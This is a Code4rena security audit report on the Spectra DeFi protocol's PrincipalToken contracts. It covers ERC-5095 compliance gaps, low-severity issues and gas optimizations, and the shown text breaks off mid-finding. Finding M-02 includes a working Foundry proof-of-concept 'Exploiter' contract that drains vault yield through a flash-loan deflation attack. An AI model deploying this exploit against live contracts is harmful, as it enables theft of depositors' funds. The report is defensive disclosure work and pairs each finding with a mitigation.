- - - Code4rena | Keeping high severity bugs out of production- - - SpectraSkip Navigation- For Projects
## Ready to secure your project?
The best time to start is now.
Get startedSecurity solutions- Competitive auditWe invented the format that disrupted the web3 industry. Find out why top protocols trust C4.

- ZenithZenith assembles auditors with proven track records to secure your project.

Resources- Docs
- Reports

- For Wardens
## Find bugs. Get paid.
Put your security research skills to work.
Become a WardenAudits- Ongoing audits
- Upcoming audits
- Past audits
- Bounties

Leaderboard- Past 90 days
- Past 365 days
- All time

Resources- Reports
- Help desk
- Docs
- GitHub

- Support
- Log in

## Login
Log in / RegisterGet an audit

# Spectra
Findings & Analysis Report

#### 2024-04-05

## Table of contents

-
Overview

- About C4

- Wardens

- Summary

- Scope

- Severity Criteria

-
Medium Risk Findings (2)

- [M-01] PrincipalToken is not ERC-5095 compliant

- [M-02] All yield generated in the IBT vault can be drained by performing a vault deflation attack using the flash loan functionality of the Principal Token contract

-
Low Risk and Non-Critical Issues

- 01 `_computeYield` should use `ERC20Metadata` instead of `IERC4626`

- 02 `_ibtUnit` is wrongly named in the convert functions

- 03 `_getPTandIBTRates` can be simplified

- 04 Typos

-
Gas Optimizations

- Table of Contents

- G-01 State variables can be packed into fewer storage slot by reducing their size (saves ~4000 Gas)

- G-02 Refactor the `PrincipalToken::getCurrentYieldOfUserInIBT` function to avoid one function call and one `Gcoldsload` when `oldIBTRate == 0`

- G-03 State variables can be packed by truncating timestamp(Instance Missed by bot)(Gas Saved ~2000 GAS)

- G-04 Remove `whenNotPaused` modifier check from the functions (Gas Saved ~100+ Gas)

- G-05 Cache external call to avoid re-calling same external function

- G-06 Change the order of `modifier` checks in `functions` to fail early, it can save gas half of the time (Gas Saved ~22000 Gas)

- G-07 State variables should be cached in stack variables rather than re-reading them from storage (Instances Missed by Bot) (Gas Saved ~100 Gas)

- G-08 Use unchecked{} whenever underflow not possible (Instances Missed by bot)(Gas Saved ~320 Gas)

- G-09 Use direct `_admin` immutable var. instead of calling `_proxyAdmin()` saves function call

- G-10 Cache function result into stack var first instead of state variables if need to read them twice

- G-11 Check `amount` for `zero` before mint/burn (Missed by bot)

- Audit Analysis

-
Analysis - Spectra Audit

- Description overview of `Spectra` Audit

- System Overview

- Approach Taken-in Evaluating `Spectra` Protocol

- Codebase Quality

- Architecture

- Systemic Risks, Centralization Risks, Technical Risks & Integration Risks

- Suggestions

- Issues surfaced from Attack Ideas in README

- Disclosures

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Spectra smart contract system written in Solidity. The audit took place between February 23—March 1 2024.

## Wardens

42 Wardens contributed reports to Spectra:

- Arabadzhiev

- ArmedGoose

- blutorque

- hunter_w3b

- ZanyBonzy

- 0x11singh99

- Myd

- aariiif

- sl1

- K42

- wangxx2026

- SBSecurity (Slavcheww and Blckhv)

- Shubham

- Giorgio

- jnforja

- dimulski

- lsaudit

- JohnSmith

- dharma09

- 14si2o_Flint

- DarkTower (OxTenma, 0xrex, and haxatron)

- 0xLogos

- erosjohn

- Aymen0909

- Limbooo

- smaul

- 0xDemon

- 0xbrett8571

- 0xhacksmithh

- Brenzee

- btk

- mrudenko

- memforvik

- Franklin

- nmirchev8

- cheatc0d3

- peanuts

- 0xLuckyLuke

- Tigerfrake

This audit was judged by Dravee.

Final report assembled by PaperParachute.

# Summary

The C4 analysis yielded an aggregated total of 2 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 2 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 11 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 3 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the C4 Spectra repository, and is composed of 7 smart contracts written in the Solidity programming language and includes 976 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, TragedyOTCommons from warden(s) IllIllI, generated the Automated Findings report and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling

- Escalation of privileges

- Arithmetic

- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on the C4 website, specifically our section on Severity Categorization.

# Medium Risk Findings (2)

## [M-01] PrincipalToken is not ERC-5095 compliant

Submitted by jnforja, also found by sl1, dimulski, wangxx2026 (1, 2), JohnSmith, 0xLogos, 14si2o_Flint, erosjohn, Aymen0909, Limbooo, Giorgio (1, 2), smaul, ZanyBonzy, 0xhacksmithh, Brenzee, btk, 0xDemon, lsaudit (1, 2), mrudenko, memforvik, Franklin, Shubham, and nmirchev8

https://github.com/code-423n4/2024-02-spectra/blob/main/src/tokens/PrincipalToken.sol#L483-L485

https://github.com/code-423n4/2024-02-spectra/blob/main/src/tokens/PrincipalToken.sol#L460-L462

https://github.com/code-423n4/2024-02-spectra/blob/main/src/tokens/PrincipalToken.sol#L278-L287

https://github.com/code-423n4/2024-02-spectra/blob/main/src/tokens/PrincipalToken.sol#L229-L237

Protocols that try to integrate with Spectra, expecting `PrincipalToken` to be ERC-5095 compliant, will face an array of issues that may damage Spectra’s brand and limit Spectra’s growth in the market.

### Proof of Concept

All official ERC-5095 requirements are on their official page. Non-compliant methods are listed below along with why they are not compliant and code POCs demonstrating the issues. To run the POCs, copy-paste them into `PrincipalToken.t.sol`:

PrincipalToken::redeem and PrincipalToken::withdraw

As specified in ERC-5095, both `withdraw` and `redeem` must support a flow where `msg.sender` has approval over the owner’s tokens:

`MUST support a redeem flow where the Principal Tokens are burned from holder directly where holder is msg.sender or msg.sender has EIP-20 approval over the principal tokens of holder.

MUST support a withdraw flow where the principal tokens are burned from holder directly where holder is msg.sender or msg.sender has EIP-20 approval over the principal tokens of holder.`

However, neither `PrincipalToken::redeem` nor `PrincipalToken::withdraw` support this flow type:

` //copy-paste into `PrincipalToken.sol`
function testRedeemDoesNotSupportERC20ApprovalFlow() public {
uint256 amountToDeposit = 1e18;
uint256 expected = _testDeposit(amountToDeposit, address(this));
_increaseTimeToExpiry();
principalToken.storeRatesAtExpiry();

principalToken.approve(MOCK_ADDR_5, UINT256_MAX);
assertEq(principalToken.allowance(address(this), MOCK_ADDR_5), UINT256_MAX);

vm.startPrank(MOCK_ADDR_5);
vm.expectRevert();
//Should not revert as MOCK_ADDR_5 has allowance over tokens.
principalToken.redeem(expected, MOCK_ADDR_5, address(this));
vm.stopPrank();
}

function testWithdrawDoesNotSupportERC20ApprovalFlow() public {
uint256 amount = 1e18;
underlying.approve(address(principalToken), amount);
principalToken.deposit(amount, testUser);

principalToken.approve(MOCK_ADDR_5, UINT256_MAX);
assertEq(principalToken.allowance(address(this), MOCK_ADDR_5), UINT256_MAX);

vm.prank(MOCK_ADDR_5);
vm.expectRevert();
//Should not revert as MOCK_ADDR_5 has allowance over tokens.
principalToken.withdraw(amount, MOCK_ADDR_5, testUser);

vm.stopPrank();
}`

PrincipalToken::maxWithdraw

According to ERC-5095, `maxWithdraw` must not revert and must return 0 if withdrawal is disabled.

`MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST return 0.

MUST NOT revert.`

However, `PrincipalToken::maxWithdraw` reverts if `PrincipalToken` is paused:

` //copy-paste into `PrincipalToken.sol`
function testMaxWithdrawRevertsWhenPausedWhenItShouldNeverRevert() public {
vm.prank(scriptAdmin);
principalToken.pause();

vm.expectRevert();
//Should not revert, should return 0 to comply to ERC-5095.
principalToken.maxWithdraw(address(this));
}`

PrincipalToken::maxRedeem

According to ERC-5095, `maxRedeem` must return 0 if redeem is disabled:

`MUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST return 0.`

However, `PrincipalToken::maxRedeem` does not return 0 when `PrincipalToken` is paused:

` //copy-paste into `PrincipalToken.sol`
function testMaxRedeemDoesNotReturnZeroWhenPausedEvenThoughItShould() public {
uint256 amountToDeposit = 1e18;
_testDeposit(amountToDeposit, address(this));

vm.prank(scriptAdmin);
principalToken.pause();

//Should return 0 to comply to ERC-5095.
assertNotEq(principalToken.maxRedeem(address(this)), 0);
}`

### Recommended Mitigation Steps

- `PrincipalToken::redeem` and `PrincipalToken::withdraw` should be changed to support a flow where `msg.sender` has EPI-20 approval over the owner’s principal tokens.

- `PrincipalToken::maxRedeem` and `PrincipalToken::maxWithdraw`should be changed to return 0 when `PrincipalToken` is paused.

Dravee (Judge) decreased severity to Medium

yanisepfl (sponsor) confirmed and commented:

Mitigated here.

## [M-02] All yield generated in the IBT vault can be drained by performing a vault deflation attack using the flash loan functionality of the Principal Token contract

Submitted by Arabadzhiev, also found by ArmedGoose and blutorque

The current implementation of the `PrincipalToken` has a flash lending functionality:

` function flashLoan(
IERC3156FlashBorrower _receiver,
address _token,
uint256 _amount,
bytes calldata _data
) external override returns (bool) {
if (_amount > maxFlashLoan(_token)) revert FlashLoanExceedsMaxAmount();

uint256 fee = flashFee(_token, _amount);
_updateFees(fee);

// Initiate the flash loan by lending the requested IBT amount
IERC20(ibt).safeTransfer(address(_receiver), _amount);

// Execute the flash loan
if (_receiver.onFlashLoan(msg.sender, _token, _amount, fee, _data) != ON_FLASH_LOAN)
revert FlashLoanCallbackFailed();

// Repay the debt + fee
IERC20(ibt).safeTransferFrom(address(_receiver), address(this), _amount + fee);

return true;
}`

And as of now, this functionality is implemented in such a way, that it allows users to borrow the whole IBT balance of the `PrincipalToken` permissionlessly:

` function maxFlashLoan(address _token) public view override returns (uint256) {
if (_token != ibt) {
return 0;
}
// Entire IBT balance of the contract can be borrowed
return IERC4626(ibt).balanceOf(address(this));
}`

This is fine on it’s own and it works as it should. However there is a specific case where it can be abused. If the IBT vault prices its shares using the following formula:

$sharePrice = {totalAssets \over totalShares}$

Then, it will fall-back to some default price value when its `totalAssets` and `totalShares` values are equal to zero. Most usually that is the value of `1`. Such is the case with the OpenZeppelin ERC4626 vault implementation, which is the most commonly used ERC4626 base implementation:

` function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view virtual returns (uint256) {
return shares.mulDiv(totalAssets() + 1, totalSupply() + 10 ** _decimalsOffset(), rounding);
}`

In that case, if the `PerincipalToken` contract happens to hold all of the IBT supply, a malicious lender can come in and perform the following exploit:

`1. Take a flash loan from the PrincipalToken contract that is exactly equal to its IBT balance
2. Redeem all of the borrowed shares in the IBT vault for their underlying asset value
3. Mint back the borrowed IBT shares + the required flash loan fee shares from the vault
4. Pay back the flash loan + the flash loan fee`

What has just happened in the above described scenario is that the malicious lender has successfully reset the IBT vault share price to its default value, by redeeming all of the vault’s shares for all of its underlying assets. Then, they have minted back the previously redeemed shares plus the required flash loan fee shares at the default price and finally paid back the flash loan with those. Ultimately, what the attacker managed to accomplish is that they managed to get `totalIBTSupply * (initialIBTPrice - defaultIBTPrice)` of underlying IBT assets at the expense of a single flash loan fee, while leaving the `PerincipalToken` contract’s users with a massive loss. More specifically, the users of the contract will lose all of their accumulated yield and potentially even more than that, depending on the IBT price at which they deposited into the PT and how far down it will be able to be deflated.

### Proof of Concept

The following Foundry PoC test demonstrates how the scenario outlined in the “Impact” section could play out, using Solidity code. It is written on top of the `PrincipalToken4` test suite contract, which uses an instance of the `MockIBT2` contract as its IBT token, which uses the same share pricing mechanism as the one described above.

`// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.20;

import {ContractPrincipalToken} from "./PrincipalToken4.t.sol";
import "openzeppelin-contracts/interfaces/IERC4626.sol";
import "openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";

contract PrincipalTokenIBTDelfation is ContractPrincipalToken {
function testDeflateIBTVault() public {
// TEST_USER_1 deposits 1 IBT into the principal token contract
vm.startPrank(TEST_USER_1);
underlying.mint(TEST_USER_1, 1e18 - 1); // -1 because TEST_USER_1 already has 1 wei of IBT
underlying.approve(address(ibt), 1e18 - 1);
ibt.deposit(1e18 - 1, TEST_USER_1);
ibt.approve(address(principalToken), 1e18);
principalToken.depositIBT(1e18, TEST_USER_1);
vm.stopPrank();

// TEST_USER_2 deposits 9 IBT into the principal token contract
vm.startPrank(TEST_USER_2);
underlying.mint(TEST_USER_2, 9e18);
underlying.approve(address(ibt), 9e18);
ibt.deposit(9e18, TEST_USER_2);
ibt.approve(address(principalToken), 9e18);
principalToken.depositIBT(9e18, TEST_USER_2);
vm.stopPrank();

// Simulate vault interest accrual by manualy inflating the share price
vm.startPrank(TEST_USER_3);
uint256 generatedYield = 10e18;
underlying.mint(TEST_USER_3, generatedYield);
underlying.transfer(address(ibt), generatedYield);
vm.stopPrank();

// Execute exploit using the Exploiter contract
Exploiter exploiterContract = new Exploiter();
uint256 underlyingBalanceBeforeExploit = underlying.balanceOf(address(exploiterContract));
principalToken.flashLoan(exploiterContract, address(ibt), 10e18, "");
uint256 underlyingBalanceAfterExploit = underlying.balanceOf(address(exploiterContract));

assertEq(underlyingBalanceBeforeExploit, 0);
assertEq(underlyingBalanceAfterExploit, generatedYield); // All of the generated yield got stollen by the attacker
}
}

contract Exploiter is IERC3156FlashBorrower {
function onFlashLoan(
address initiator,
address token,
uint256 amount,
uint256 fee,
bytes calldata data
) external returns (bytes32) {
IERC4626 ibt = IERC4626(token);

ibt.redeem(amount, address(this), address(this));

IERC20(ibt.asset()).approve(address(ibt), type(uint256).max);
ibt.mint(amount + fee, address(this));

ibt.approve(msg.sender, amount + fee);
return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
}`

### Recommended Mitigation Steps

In the `PrincipalToken::flashLoan` function, verify that the IBT rate/price has not decreased once the flash loan has been repaid:

` function flashLoan(
IERC3156FlashBorrower _receiver,
address _token,
uint256 _amount,
bytes calldata _data
) external override returns (bool) {
if (_amount > maxFlashLoan(_token)) revert FlashLoanExceedsMaxAmount();

uint256 fee = flashFee(_token, _amount);
_updateFees(fee);

+ uint256 initialIBTRate = IERC4626(ibt).convertToAssets(ibtUnit);

// Initiate the flash loan by lending the requested IBT amount
IERC20(ibt).safeTransfer(address(_receiver), _amount);

// Execute the flash loan
if (_receiver.onFlashLoan(msg.sender, _token, _amount, fee, _data) != ON_FLASH_LOAN)
revert FlashLoanCallbackFailed();

// Repay the debt + fee
IERC20(ibt).safeTransferFrom(address(_receiver), address(this), _amount + fee);

+ uint256 postLoanRepaymentIBTRate = IERC4626(ibt).convertToAssets(ibtUnit);

+ if (postLoanRepaymentIBTRate < initialIBTRate) revert FlashLoanDecreasedIBTRate();

return true;
}`

Dravee (Judge) decreased severity to Medium and commented:

As per the conversation with the sponsor under 240 and given that the sponsor agreed that the finding could either be low or medium, I’ll acknowledge this bug as being more than a low. Although the edge case was mentioned to be unlikely, there’s still value in the mitigation (we never know how this could turn out to be further exploited).

Selecting the current report as it’s the most complete (although the remediation is too restrictive).

yanisepfl (Sponsor) acknowledged via duplicate #240 and commented:

Hello all,

Thanks for the interesting conversation.

After discussing this issue and #111 with the team, we came to the conclusion that:

Having all the IBTs concentrated in our PTs is a very uncommon scenario. In particular, the usefulness of Spectra also relies on markets and if most of the IBTs are in our vaults then that would imply none or few are used as liquidity in the markets.

As it was rightly mentioned by @kazantseff, it is mostly an issue on the IBT 4626 not to be protected against vault price resets. Our protocol is neutral, notices the rate change and act accordingly (as per our design).

We therefore consider it a low or medium severity issue.

Concerning the mitigation, we believe there is no better solution than to have dead shares. The mitigation proposed in #111 is too restrictive (e.g. imprecisions) and the one proposed here wouldn’t work depending on the attacker’s PTs/YTs/IBTs ownership.

I hope this helps!

Edit: We acknowledge this issue. It will be clearly specified in our UI and documentations that users should be careful where they invest their funds. In particular, they are expected to make sure the IBTs follow the ERC 4626 and that their rate cannot be easily controlled by someone (e.g. price reset attack, see https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3800 & https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3979). In particular, the PoC provided here does not work on Open Zeppelin’s 4626.

For full discussion, see duplicate issue #240.

# Low Risk and Non-Critical Issues

For this audit, 11 reports were submitted by wardens detailing low risk and non-critical issues. The report highlighted below by SBSecurity received the top score from the judge.

The following wardens also submitted reports: sl1, Shubham, cheatc0d3, peanuts, DarkTower, 14si2o_Flint, 0xDemon, ArmedGoose, 0xLuckyLuke, and Tigerfrake.

## [01] `_computeYield` should use `ERC20Metadata` instead of `IERC4626`

Issue Description:

When both PT and IBT rates are decreasing, `_computeYield` will enter the else statement where it will check if the expected and actual yields are more than the `SAFETY_BOUND` . The value checked against the invariant is converted to the decimals of the underlying token of `IBT`, but the wrong interface is used there. The `underlying` will be “cast” to the `ERC4626` interface, but since `ERC4626` inherits from `ERC20`, it will have `decimals()`. At all this only use the wrong interface, as the `underlying` is `ERC20`.

PrincipalTokenUtils.sol#L113

`function _computeYield(
address _user,
uint256 _userYieldIBT,
uint256 _oldIBTRate,
uint256 _ibtRate,
uint256 _oldPTRate,
uint256 _ptRate,
address _yt
) external view returns (uint256) {
yieldInAssetRay = yieldInAssetRay.fromRay(
IERC4626(IPrincipalToken(IYieldToken(_yt).getPT()).underlying()).decimals()
) < SAFETY_BOUND
? 0
: yieldInAssetRay;
}`

Recommendation:

Instead of `IERC4626` , consider using `IERC20Metadata`

`function _computeYield(
address _user,
uint256 _userYieldIBT,
uint256 _oldIBTRate,
uint256 _ibtRate,
uint256 _oldPTRate,
uint256 _ptRate,
address _yt
) external view returns (uint256) {
yieldInAssetRay = yieldInAssetRay.fromRay(
- IERC4626(IPrincipalToken(IYieldToken(_yt).getPT()).underlying()).decimals()
+ IERC20Metadata(IPrincipalToken(IYieldToken(_yt).getPT()).underlying()).decimals()
) < SAFETY_BOUND
? 0
: yieldInAssetRay;
}`

## [02] `_ibtUnit` is wrongly named in the convert functions

Issue Description:

Convert functions in `PrincipalTokenUtils` have confusing argument `_ibtUnit` which is passed in the `_computeYield`. We can observe that in all the places where `_convertToSharesWithRate` and `_convertToAssetsWithRate` are used `RayMath.RAY_UNIT` is passed as `_ibtUnit`. But the `_ibtRate` will be in the ibt decimals, not in `RAY`.

`function _computeYield(
address _user,
uint256 _userYieldIBT,
uint256 _oldIBTRate,
uint256 _ibtRate,
uint256 _oldPTRate,
uint256 _ptRate,
address _yt
) external view returns (uint256) {
...More code
yieldInAssetRay =
_convertToAssetsWithRate( //@audit here
userYTBalanceInRay,
_oldPTRate - _ptRate,
RayMath.RAY_UNIT,
Math.Rounding.Floor
) +
_convertToAssetsWithRate( //@audit here
ibtOfPTInRay,
_ibtRate - _oldIBTRate,
RayMath.RAY_UNIT,
Math.Rounding.Floor
);
} else {
uint256 actualNegativeYieldInAssetRay = _convertToAssetsWithRate( //@audit here
userYTBalanceInRay,
_oldPTRate - _ptRate,
RayMath.RAY_UNIT,
Math.Rounding.Floor
);
...More code
}
newYieldInIBTRay = _convertToSharesWithRate( //@audit here
yieldInAssetRay,
_ibtRate,
RayMath.RAY_UNIT,
Math.Rounding.Floor
);
}
}`

Recommendation:

Rename `_ibtUnit` to `ray` or something more intuitive to the reader.

## [03] `_getPTandIBTRates` can be simplified

Issue Description:

`_getPTandIBTRates` contains logic whether PT has expired and returns if so, also there is a redundant `else` statement which add unnecessary code to the function:

PrincipalToken.sol#L924-L926

`function _getPTandIBTRates(bool roundUpPTRate) internal view returns (uint256, uint256) {
if (ratesAtExpiryStored) {
return (ptRate, ibtRate);
} else {
return _getCurrentPTandIBTRates(roundUpPTRate);
}
}`

Recommendation:

Remove the else statement, so when maturity hasn’t passed code will automatically return the current `PT` and `IBT`, the same as it entered the else.

`function _getPTandIBTRates(bool roundUpPTRate) internal view returns (uint256, uint256) {
if (ratesAtExpiryStored) {
return (ptRate, ibtRate);
}
- else {
return _getCurrentPTandIBTRates(roundUpPTRate);
- }
}`

## [04] Typos

Issue Description:

Comments for `ptRate` and `ibtRate` contains unnecessary ‘or’ which can be removed:

PrincipalToken.sol#L55-L56

`uint256 private ptRate; // or PT price in asset (in Ray)
uint256 private ibtRate; // or IBT price in asset (in Ray)`

Recommendation:

Modify the comments by removing the `or`:

`uint256 private ptRate; // PT price in asset (in Ray)
uint256 private ibtRate; // IBT price in asset (in Ray)`

Also private variables names can be more consistent with underscore before them:

` address private rewardsProxy;
bool private ratesAtExpiryStored;
address private ibt; // address of the Interest Bearing Token 4626 held by this PT vault
address private _asset; // the asset of this PT vault (which is also the asset of the IBT 4626)
address private yt; // YT corresponding to this PT, deployed at initialization
uint256 private ibtUnit; // equal to one unit of the IBT held by this PT vault (10^decimals)
uint256 private _ibtDecimals;
uint256 private _assetDecimals;

uint256 private ptRate; // or PT price in asset (in Ray)
uint256 private ibtRate; // or IBT price in asset (in Ray)
uint256 private unclaimedFeesInIBT; // unclaimed fees
uint256 private totalFeesInIBT; // total fees
uint256 private expiry; // date of maturity (set at initialization)
uint256 private duration; // duration to maturity`

yanisepfl (Spectra) acknowledged and commented:

Mitigated L-01, L-02, L-03, and L-04 here.

# Gas Optimizations

For this audit, 3 reports were submitted by wardens detailing gas optimizations. The report highlighted below by 0x11singh99 received the top score from the judge.

The following wardens also submitted reports: K42 and dharma09.

Note : G-03, G-07, G-08 and G-11 only contain the instances which were missed by the winning bot. Since they are major gas savings I included those missed instances.

## Table of Contents

- [G-01] State variables can be packed into fewer storage slot by reducing their size (saves ~4000 Gas)

- [G-02] Refactor the `PrincipalToken::getCurrentYieldOfUserInIBT` function to avoid one function call and one `Gcoldsload` when `oldIBTRate == 0`

- [G-03] State variables can be packed by truncating timestamp(Instance Missed by bot)(Gas Saved ~2000 GAS)

- [G-04] Remove `whenNotPaused` modifier check from the functions (Gas Saved ~100+ Gas)

- [G-05] Cache external call to avoid re-calling same external function

- [G-06] Change the order of `modifier` checks in `functions` to fail early, it can save gas Half of the times(Gas Saved ~22000 Gas)

- [G-07] State variables should be cached in stack variables rather than re-reading them from storage(Instances Missed by Bot) (Gas Saved ~100 Gas)

- [G-08] Use unchecked{} whenever underflow not possible (Instances Missed by bot)(Gas Saved ~320 Gas)

- [G-09] Use direct `_admin` immutable var. instead of calling `_proxyAdmin()` saves function call

- [G-10] Cache function result into stack var first instead of state variables if need to read them twice

- [G-11] Check `amount` for `zero` before mint/burn (Missed by bot)

### Auditor’s Disclaimer

All findings are good gas savers and 100% safe to implement without any protocol/logic risk.

## [G-01] State variables can be packed into fewer storage slot by reducing their size (saves ~4000 Gas)

The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to each other in storage and this will pack the values together into a single 32 byte storage slot (if values combined are <= 32 bytes). If the variables packed together are retrieved together in functions (more likely with structs), we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a Gwarmaccess (100 gas) versus a Gcoldsload (2100 gas).

### `SAVE: 4000 GAS, 2 SLOT`

### `_ibtDecimals`, `_assetDecimals`, and `rewardsProxy` can be packed in a single slot `SAVES: 4000 Gas, 2 SLOT`

Since `_ibtDecimals` and `_assetDecimals` initialized in `initialize` function with uint8 size of decimals we can see at line 141 and 142 `IERC4626(_ibt).decimals()` and `PrincipalTokenUtil._tryGetTokenDecimals(_asset)` returning values of uint8 type which are directly assigned into `_ibtDecimals` and `_assetDecimals` respectively. So uint8 is enough to hold these decimal values therefore `_ibtDecimals` and `_assetDecimals` size can be reduced to `uint8` each which can be packed with address `rewardsProxy` into 1 slot. Saves 2 storage slots.

`File : src/tokens/PrincipalToken.sol

46: address private rewardsProxy;
...

52: uint256 private _ibtDecimals;
53: uint256 private _assetDecimals;`

PrincipalToken.sol#L46-L53

`File : src/tokens/PrincipalToken.sol

141: _ibtDecimals = IERC4626(_ibt).decimals();//@audit returning decimal of uint8 type
142: _assetDecimals = PrincipalTokenUtil._tryGetTokenDecimals(_asset);//@audit returning decimal of uint8 type`

PrincipalToken.sol#L141-142

Recommended Mitigation Steps:

`File : src/tokens/PrincipalToken.sol

46: address private rewardsProxy;
+ uint8 private _ibtDecimals;
+ uint8 private _assetDecimals;
...

-52: uint256 private _ibtDecimals;
-53: uint256 private _assetDecimals;`

## [G-02] Refactor the `PrincipalToken::getCurrentYieldOfUserInIBT` function to avoid one function call and one `Gcoldsload` when `oldIBTRate == 0`

When `oldIBTRate == 0` then calling `_getPTandIBTRates(false)` (at line 563 below) and reading `ptRateOfUser[_user]` (at line 565) is useless since their result not used until `_oldIBTRate != 0` So it wastes lot of Gas to call and read them when `oldIBTRate == 0` since returned `_yieldOfUserInIBT` value will be 0 when `oldIBTRate` is 0. So place calling `_getPTandIBTRates(false)` and reading `ptRateOfUser[_user]` lines inside if block when `_oldIBTRate != 0` where their values are being used to calculate returned value `_yieldOfUserInIBT`.

### When `oldIBTRate == 0` It can save safely multiple SLOADs and external calls inside `_getPTandIBTRates(false)` and 1 SLOAD in ptRateOfUser[_user] reading.

`File : src/tokens/PrincipalToken

560: function getCurrentYieldOfUserInIBT(
address _user
) external view override returns (uint256 _yieldOfUserInIBT) {
563: (uint256 _ptRate, uint256 _ibtRate) = _getPTandIBTRates(false);
uint256 _oldIBTRate = ibtRateOfUser[_user];
565: uint256 _oldPTRate = ptRateOfUser[_user];
if (_oldIBTRate != 0) {
_yieldOfUserInIBT = PrincipalTokenUtil._computeYield(
_user,
yieldOfUserInIBT[_user],
_oldIBTRate,
_ibtRate,
_oldPTRate,
_ptRate,
yt
);
_yieldOfUserInIBT -= PrincipalTokenUtil._computeYieldFee(_yieldOfUserInIBT, registry);
}
578: }`

PrincipalToken.sol#L560C5-L578C6

Recommended Mitigation Steps:

`File : src/tokens/PrincipalToken

function getCurrentYieldOfUserInIBT(
address _user
) external view override returns (uint256 _yieldOfUserInIBT) {
- (uint256 _ptRate, uint256 _ibtRate) = _getPTandIBTRates(false);
uint256 _oldIBTRate = ibtRateOfUser[_user];
- uint256 _oldPTRate = ptRateOfUser[_user];
if (_oldIBTRate != 0) {
+ (uint256 _ptRate, uint256 _ibtRate) = _getPTandIBTRates(false);
+ uint256 _oldPTRate = ptRateOfUser[_user];
_yieldOfUserInIBT = PrincipalTokenUtil._computeYield(
_user,
yieldOfUserInIBT[_user],
_oldIBTRate,
_ibtRate,
_oldPTRate,
_ptRate,
yt
);
_yieldOfUserInIBT -= PrincipalTokenUtil._computeYieldFee(_yieldOfUserInIBT, registry);
}
}`

## [G-03] State variables can be packed by truncating timestamp(Instance Missed by bot)(Gas Saved ~2000 GAS)

The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to each other in storage and this will pack the values together into a single 32 byte storage slot (if values combined are <= 32 bytes). If the variables packed together are retrieved together in functions (more likely with structs), we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a Gwarmaccess (100 gas) versus a Gcoldsload (2100 gas).

### `expiry` and `address yt` can be packed in a single slot `SAVES: 2000 Gas, 1 SLOT`

Since `expiry` holds time (block.timestamp + duration) in seconds. So `uint64` is more than sufficient to hold any realistic time.

`File : src/tokens/PrincipalToken.sol

50: address private yt; // YT corresponding to this PT, deployed at initialization
...

59: uint256 private expiry; // date of maturity (set at initialization)`

PrincipalToken.sol#L50, PrincipalToken.sol#L59

Recommended Mitigation Steps:

`File : src/tokens/PrincipalToken.sol

50: address private yt; // YT corresponding to this PT, deployed at initialization
+ uint64 private expiry; // date of maturity (set at initialization)
...

-59: uint256 private expiry; // date of maturity (set at initialization)`

## [G-04] Remove `whenNotPaused` modifier check from the functions (Gas Saved ~100+ Gas)

### Remove `whenNotPaused` from `previewWithdraw` function

Since `whenNotPaused` modifier also used in `previewWithdrawIBT` function which is called in `previewWithdraw` so it will be redundant to check same thing twice.

Reducing one extra call to whenNotPAused can save 1 SLOAD and other opcodes associated with this modifier.

### Saves At least ~100 GAS

`File : src/tokens/PrincipalToken.sol

46: function previewWithdraw(
47: uint256 assets
48: ) external view override whenNotPaused returns (uint256) {
49: uint256 ibts = IERC4626(ibt).previewWithdraw(assets);
50: return previewWithdrawIBT(ibts);
51: }`

PrincipalToken.sol#L446C1-L451C6

### Remove `whenNotPaused` from `_beforeWithdraw` function

Since `whenNotPaused` modifier also used in `maxWithdraw` function which is called in `_beforeWithdraw` so it will be redundant to check same thing twice.

`File : src/tokens/PrincipalToken.sol

828: function _beforeWithdraw(uint256 _assets, address _owner) internal whenNotPaused nonReentrant {
829: if (_owner != msg.sender) {
830: revert UnauthorizedCaller();
831: }
832: if (block.timestamp >= expiry) {
833: if (!ratesAtExpiryStored) {
834: storeRatesAtExpiry();
835: }
836: } else {
837: updateYield(_owner);
838: }
839: if (maxWithdraw(_owner) < _assets) {
840: revert UnsufficientBalance();
841: }
}`

PrincipalToken.sol#L828C1-L842C6

## [G-05] Cache external call to avoid re-calling same external function

Since `IYieldToken(_yt).decimals()` and `IERC20Metadata(_yt).decimals()` are calling same `decimals()` function on same `_yt` address contract. That means both call will return same result since same function on same contract called just interface to prepare instances are different but underlying decimals definition is same so this call can be cached after at first call instead of re-calling in same function twice.

This call is called to YieldToken decimals function.
So it saves 1 External call which includes another external call in YieldToken decimals function. So it saves a lot of gas caching `IYieldToken(_yt).decimals()` in PrincipalTokenUtil::_computeYield function.

`File : src/libraries/PrincipalTokenUtil.sol

55: function _computeYield(
...
68: uint256 userYTBalanceInRay = IYieldToken(_yt).actualBalanceOf(_user).toRay(
69: IYieldToken(_yt).decimals() //@audit cache this
70: );
...
129: return _userYieldIBT + newYieldInIBTRay.fromRay(IERC20Metadata(_yt).decimals());//@audit use cached valued instead of re-calling decimals()
130: }`

(https://github.com/code-423n4/2024-02-spectra/blob/main/src/libraries/PrincipalTokenUtil.sol#L55C1-L130C6)

`15: contract YieldToken is IYieldToken, ERC20PermitUpgradeable {
...
105: function decimals()
106: public
107: view
108: virtual
